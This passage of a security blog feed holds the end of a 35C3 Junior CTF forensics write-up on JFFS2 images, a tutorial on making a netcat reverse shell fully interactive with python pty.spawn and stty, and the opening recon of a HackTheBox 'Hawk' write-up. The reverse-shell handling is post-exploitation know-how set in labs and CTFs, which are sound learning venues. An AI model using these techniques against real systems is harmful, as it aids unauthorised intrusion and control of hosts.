&lt;p&gt;After some research, we found &lt;a href=&quot;https://github.com/sviehb/jefferson&quot;&gt;jefferson&lt;/a&gt; which is a &lt;strong&gt;JFFS2 filesystem extraction tool&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/For/files&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jefferson rare-fs.bin &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; rare_mount.out
dumping fs &lt;span class=&quot;c&quot;&gt;#1 to /home/boiteaclou/CTF/2018/35C3-Junior/For/files/rare_mount.out/fs_1&lt;/span&gt;
Jffs2_raw_dirent count: 2
Jffs2_raw_inode count: 2155
Jffs2_raw_summary count: 0
Jffs2_raw_xattr count: 0
Jffs2_raw_xref count: 0
Endianness: Big
writing S_ISREG RickRoll_D-oHg5SJYRHA0.mkv
writing S_ISREG flag
&lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The tool extracted a RickRoll video as long as the flag!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/For/files/rare_mount.out/fs_1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag
35C3_big_or_little_1_dont_give_a_shizzle
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;junior-ctf-forensic---epic_mount&quot;&gt;[Junior CTF] Forensic - epic_mount&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;A little bit of stego. Not every header field looks like the other.&lt;/p&gt;

  &lt;p&gt;FS&lt;/p&gt;

  &lt;p&gt;Difficulty estimate: Easy-Medium&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This second &lt;a href=&quot;http://localhost:4000/assets/2018-12-30/epic_mount&quot; title=&quot;epic_mount&quot;&gt;file&lt;/a&gt; was also in JFFS2 format.&lt;/p&gt;

&lt;p&gt;Jefferson won’t do all the job this time! It returns the following error: &lt;code class=&quot;highlighter-rouge&quot;&gt;hdr_crc does not match!&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Digging into the code of jefferson, we found the part responsible of this error:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mtd_crc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node_crc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node_crc_match&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'hdr_crc does not match!'&lt;/span&gt;
    &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node_crc_match&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Header CRCs seem to be broken so we added the following two lines to the else clause:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'now : '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node_crc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'should be : '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mtd_crc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That way, we could manually fix the broken CRCs using an Hex editor. It looked good on the paper but it didn’t gave us the flag…&lt;/p&gt;

&lt;p&gt;Then, we remembered the challenge statement evocating some stego and we decided to dump the headers for which the CRC was wrong. We did this by adding the following print statement to jefferson’s code:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From this dump, we can reconstruct the flag by extracting one byte of each line:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/For&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;dump_chall2.txt
D-0o3&lt;span class=&quot;se&quot;&gt;\\\&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\@&lt;/span&gt;
D-0C&lt;span class=&quot;se&quot;&gt;\\\p&lt;/span&gt;
D-0o
    3&lt;span class=&quot;se&quot;&gt;\\\&lt;/span&gt;
D-0o_&lt;span class=&quot;se&quot;&gt;\\\P&lt;/span&gt;
D-0o&lt;span class=&quot;s1&quot;&gt;'h\\\P
D-0o+i\\\
Bd\\\L
D-0ove\\\
D-0o_\\\
D-0om\\\
D-0oe\\\
D-0o_\\\        @
D-0ob\\\        p
D-0oa\\\

D-0ob\\\

D-0oy\\\

D-0o_\\\
D-0o\\\
D-0on\\\@
D-0oMe\\\
D-0oN_\\\
D-0o:m\\\P
@@vCo\\\Q@
;.\r\\\U0
D-0oe\\\U
D-0o_\\\X
jUt\\\Zp
D-0oi\\\\0
-Cm\\\]
@@ie\\\
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;35C3_hide_me_baby_one_more_time&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;junior-ctf-forensic---legendary_mount&quot;&gt;[Junior CTF] Forensic - legendary_mount&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Something’s horribly broken. :(&lt;/p&gt;

  &lt;p&gt;FS&lt;/p&gt;

  &lt;p&gt;Difficulty estimate: Medium&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;jefferson&lt;/code&gt; doesn’t reveal anything apart from the same troll video as for the two previous challenges. The challenge statement suggests that &lt;strong&gt;something is corrupted&lt;/strong&gt; so followed this track.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; shows a few interesting strings like “ROFL”, “rofl” and “/secret/flag” so we decided to examine this file with an hex editor.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.inf.u-szeged.hu/projectdirs/jffs2/jffs2-anal/jffs2-anal.html&quot;&gt;This resource&lt;/a&gt; was very helpful for understanding the file structure.&lt;/p&gt;

&lt;p&gt;Using the hex editor, we can see &lt;strong&gt;a corrupted file&lt;/strong&gt; located at the end.
With the same technique we used during epic_mount for printing the corrupted bytes, we managed to fix several &lt;strong&gt;hdr_crc&lt;/strong&gt;, &lt;strong&gt;node_crc&lt;/strong&gt;, &lt;strong&gt;data_crc&lt;/strong&gt; and a &lt;strong&gt;zlib header&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The following two screen captures show the before/after with all of our corrections.&lt;/p&gt;

&lt;p&gt;BEFORE:
&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/chall3_original.png&quot; alt=&quot;Before&quot; title=&quot;Before&quot; /&gt;&lt;/p&gt;

&lt;p&gt;AFTER:
&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/chall3_fixed.png&quot; alt=&quot;After&quot; title=&quot;After&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, we ran &lt;code class=&quot;highlighter-rouge&quot;&gt;jefferson&lt;/code&gt; which gave us a file containing the flag!&lt;/p&gt;

&lt;p&gt;Flag &lt;code class=&quot;highlighter-rouge&quot;&gt;35C3_mama_what_happend_to_my_honda_CR-C&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Congratulations again to &lt;strong&gt;$in&lt;/strong&gt; for theses forensic challenges!&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">This weekend was held the 35th Chaos Communication Congress (35C3) as long as its excellent CTF. Hopefully, a Junior CTF was also proposed, which was way more accessible than the main CTF (at least for me :wink:). In this post, you’ll find concise writeups of most of the challenges my team and I solved from both CTFs.</summary></entry><entry><title type="html">Upgrading to a fully interactive reverse shell</title><link href="http://localhost:4000/Fully-interactive-reverse-shell.html" rel="alternate" type="text/html" title="Upgrading to a fully interactive reverse shell" /><published>2018-12-27T10:00:00+01:00</published><updated>2018-12-27T10:00:00+01:00</updated><id>http://localhost:4000/Fully-interactive-reverse-shell</id><content type="html" xml:base="http://localhost:4000/Fully-interactive-reverse-shell.html">&lt;p&gt;Let’s say you’re in the middle of a hacking challenge or pentesting assessment and you finally manage to get a &lt;strong&gt;reverse shell&lt;/strong&gt; on your target. This short article will explain you how to obtain &lt;span style=&quot;color:Green&quot;&gt;a fully interactive version of your reverse shell&lt;/span&gt;, that will allow commands like &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;nano&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, etc… but also &lt;strong&gt;CTRL+C&lt;/strong&gt; and &lt;strong&gt;tab completion&lt;/strong&gt;.
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h2 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#spawning-a-pty&quot; id=&quot;markdown-toc-spawning-a-pty&quot;&gt;Spawning a PTY&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#resizing-and-tab-completion&quot; id=&quot;markdown-toc-resizing-and-tab-completion&quot;&gt;Resizing and tab completion&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#adding-some-color&quot; id=&quot;markdown-toc-adding-some-color&quot;&gt;Adding some color&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;spawning-a-pty&quot;&gt;Spawning a PTY&lt;/h2&gt;

&lt;p&gt;It doesn’t matter which way you got your initial reverse shell, it should approximately look like this:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 9999
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 9999 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1] 40610
id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A lot of Unix commands require to be executed from a terminal. But, the classical netcat reverse shell you obtain at first has no TTY associated. If you wish to know a bit more about the internal working of TTYs, I recommend you this great article &lt;a href=&quot;http://www.linusakesson.net/programming/tty/&quot;&gt;The TTY demystified&lt;/a&gt; from Linus Akesson.&lt;/p&gt;

&lt;p&gt;In order to overcome this difficulty, we will use &lt;strong&gt;python PTY module&lt;/strong&gt; and especially the &lt;strong&gt;spawn&lt;/strong&gt; function:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;pty.spawn&lt;/strong&gt;(argv[, master_read[, stdin_read]])&lt;/p&gt;

  &lt;p&gt;Spawn a process, and connect its controlling terminal with the current process’s standard io. This is often used to &amp;gt;baffle programs which insist on reading from the controlling terminal.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Python is one of the best option because it is almost always installed on the target machine. If by any chance it’s not the case, you can still try python3.&lt;/p&gt;

&lt;p&gt;The command to execute is the following:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;);'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It should give the following output:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;);'&lt;/span&gt;
www-data@TARGET:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now you can use commands that require to be executed from a terminal.&lt;/p&gt;

&lt;h2 id=&quot;resizing-and-tab-completion&quot;&gt;Resizing and tab completion&lt;/h2&gt;

&lt;p&gt;If by mistake, you run an endless command and hit &lt;strong&gt;CTRL+C&lt;/strong&gt;, your reverse shell will disappear as well as your &lt;em&gt;joie de vivre&lt;/em&gt;.
Also, you could see the output of the &lt;code class=&quot;highlighter-rouge&quot;&gt;ps&lt;/code&gt; command truncated because the size of the reverse shell on the remote machine doesn’t suit the size of your host terminal.&lt;/p&gt;

&lt;p&gt;These two issues can be solved following this procedure:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Background your reverse shell with &lt;strong&gt;CTRL+Z&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Print the size of your host terminal: &lt;code class=&quot;highlighter-rouge&quot;&gt;stty -a |cut -d';' -f2-3 | head -n1&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Transfer local hotkeys to the remote shell: &lt;code class=&quot;highlighter-rouge&quot;&gt;stty raw -echo&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;If you’re using zsh or another custom shell different from bash, this command may not work properly.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;Bring the reverse shell back to foreground: &lt;code class=&quot;highlighter-rouge&quot;&gt;fg&lt;/code&gt;. You may need to hit &lt;strong&gt;ENTER&lt;/strong&gt; after this command.&lt;/li&gt;
  &lt;li&gt;Inside the remote shell, adjust the size: &lt;code class=&quot;highlighter-rouge&quot;&gt;stty rows &amp;lt;ROWS&amp;gt; cols &amp;lt;COLS&amp;gt;&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You should now have an interactive reverse shell with &lt;strong&gt;tab completion&lt;/strong&gt;, &lt;strong&gt;signals handling&lt;/strong&gt;, &lt;strong&gt;no truncated outputs&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;adding-some-color&quot;&gt;Adding some color&lt;/h2&gt;

&lt;p&gt;Now the icing on the cake, let’s add some color!&lt;/p&gt;

&lt;p&gt;Simply echo the value of $TERM environment variable in your local terminal and set it to the same value in the remote shell:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TERM&lt;/span&gt;
xterm-256color

www-data@TARGET:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm-256color
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You need to &lt;code class=&quot;highlighter-rouge&quot;&gt;reset&lt;/code&gt; the shell in order for the changes to take place.&lt;/p&gt;

&lt;p&gt;You should now feel at home inside your reverse shell! :smile:&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Let’s say you’re in the middle of a hacking challenge or pentesting assessment and you finally manage to get a reverse shell on your target. This short article will explain you how to obtain a fully interactive version of your reverse shell, that will allow commands like su, vi, nano, ssh, etc… but also CTRL+C and tab completion.</summary></entry><entry><title type="html">HackTheBox: Hawk writeup</title><link href="http://localhost:4000/HackTheBox-Hawk.html" rel="alternate" type="text/html" title="HackTheBox: Hawk writeup" /><published>2018-12-01T22:00:00+01:00</published><updated>2018-12-01T22:00:00+01:00</updated><id>http://localhost:4000/HackTheBox-Hawk</id><content type="html" xml:base="http://localhost:4000/HackTheBox-Hawk.html">&lt;p&gt;Hawk has been retired from HackTheBox active machines so here is my writeup explaining how I rooted this machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/hawk-box.png&quot; alt=&quot;Hawk box&quot; title=&quot;Hawk Box&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this article, we will crack a &lt;strong&gt;salted OpenSSL encrypted file&lt;/strong&gt;, upload a reverse shell to an instance of &lt;strong&gt;Drupal 7 CMS&lt;/strong&gt;. Then, we will use a &lt;strong&gt;SSH port-forwarding&lt;/strong&gt; trick to access a &lt;strong&gt;H2 database console&lt;/strong&gt; disallowing remote connections and exploit this app to get root on the machine. Enjoy your reading!
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h2 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#initial-foothold-and-user-access&quot; id=&quot;markdown-toc-initial-foothold-and-user-access&quot;&gt;Initial Foothold And User Access&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#recon&quot; id=&quot;markdown-toc-recon&quot;&gt;Recon&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ftp-anonymous-login&quot; id=&quot;markdown-toc-ftp-anonymous-login&quot;&gt;FTP Anonymous Login&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#salted-openssl-decryption&quot; id=&quot;markdown-toc-salted-openssl-decryption&quot;&gt;Salted OpenSSL Decryption&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#drupal-reverse-shell-upload&quot; id=&quot;markdown-toc-drupal-reverse-shell-upload&quot;&gt;Drupal Reverse Shell Upload&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#stored-credentials-retrieval&quot; id=&quot;markdown-toc-stored-credentials-retrieval&quot;&gt;Stored credentials retrieval&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#python-shell-escape&quot; id=&quot;markdown-toc-python-shell-escape&quot;&gt;Python Shell Escape&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#elevating-privileges&quot; id=&quot;markdown-toc-elevating-privileges&quot;&gt;Elevating privileges&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ssh-port-forwarding&quot; id=&quot;markdown-toc-ssh-port-forwarding&quot;&gt;SSH Port Forwarding&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#h2-database-console&quot; id=&quot;markdown-toc-h2-database-console&quot;&gt;H2 Database Console&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#getting-a-root-shell&quot; id=&quot;markdown-toc-getting-a-root-shell&quot;&gt;Getting a Root Shell&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;initial-foothold-and-user-access&quot;&gt;Initial Foothold And User Access&lt;/h2&gt;

&lt;h3 id=&quot;recon&quot;&gt;Recon&lt;/h3&gt;

&lt;p&gt;As with every machine, we only know its &lt;strong&gt;IP address&lt;/strong&gt; so we have to start with &lt;strong&gt;the reconnaissance phase&lt;/strong&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; is always a weapon of choice for this.&lt;/p&gt;

&lt;p&gt;Let’s start with &lt;strong&gt;a basic scan using default scripts&lt;/strong&gt; (-sC option). We will run a deeper scan if nothing is found.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/Hawk 10.10.10.102
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.20
|      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBj1TNZ7AO3WSpSMz0UoHlGmWQRlvXcyMXMRhDJ8X+9kZZGKkdXxWcDAu/OvUXdwCKVY+YjPPY8wi+jqKIQXlgICA3MEcg3RlLoHPTUh6KFmPxlT7Heaca7xSJ+BnhFxYF+bhhiaHgcaK8qlZFc9qS2Un3oNS6VDAAHOx2p4FU8OVM/yuik9qt6nxAQVS/v3mZfpVUm3HKOOcfXzyZEZAwrAWHk+2Y2yCBUUY1AmCMed566BfmeEOYXJU18I92fsSOhuzTt7tqX4u66SO1cyLTJczSA7gF42K8O+VPyn3pWnLmMBnAcZS0KbMUKVPa3UBSScxl5nLlSFRyJ1rCBxs7
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM0hCdwqpZ6zvQpLiZ5/tsUDQeVMEXicRx6H8AOW8lyzsHJrrQWgqM1vo5jKUn+bMazqzZ1SbP8QJ3JDS2/SlHs&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
|   256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3kNN27mM1080x8c4aOWptSRg6yN21uBMSQiKk1PrsP
